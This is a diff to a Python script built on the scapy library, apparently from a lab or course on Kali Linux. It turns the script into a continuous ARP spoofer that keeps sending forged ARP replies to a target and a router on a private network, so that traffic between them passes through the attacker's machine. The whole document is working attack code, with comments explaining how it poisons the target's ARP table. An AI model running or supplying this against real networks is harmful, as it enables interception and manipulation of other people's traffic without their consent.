@@ -1,10 +1,16 @@
+import time
+
 import scapy.all as scapy
 from scapy.layers.l2 import *
 
 def main():
-
-    spoof(pdst="172.16.149.129", psrc="172.16.149.2")
-    spoof(pdst="172.16.149.2", psrc="172.16.149.129")
+    packets_sent = 0;
+    while True:
+        spoof(pdst="172.16.149.129", psrc="172.16.149.2")
+        spoof(pdst="172.16.149.2", psrc="172.16.149.129")
+        packets_sent += 2
+        print(f"[+] Sent {packets_sent} packets")
+        time.sleep(2)
 
 
 def get_mac(ip):
@@ -30,7 +36,7 @@ def get_mac(ip):
     for element in answered_list:
         clients_lists.append({"ip": element[1].psrc, "mac": element[1].hwsrc})
         # print(f"{element[1].psrc}\t\t{element[1].hwsrc}")
-    print(clients_lists[0]["mac"])
+    # print(clients_lists[0]["mac"])
     return clients_lists[0]["mac"]
 
 def spoof(pdst, psrc):
@@ -41,11 +47,11 @@ def spoof(pdst, psrc):
     # this associates the ip address of the router with the MAC address of the kali machine
     # in the ARP table of the target
     packet = scapy.ARP(op=2, pdst=pdst, hwdst=target_mac, psrc=psrc)
-    print(f"packet.show(): {packet.show()}")
-    print(f"packet.summary(): {packet.summary()}")
+    # print(f"packet.show(): {packet.show()}")
+    # print(f"packet.summary(): {packet.summary()}")
     # send the packet and poison the table
     # this will change the MAC address associated with the psrc address
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 
 
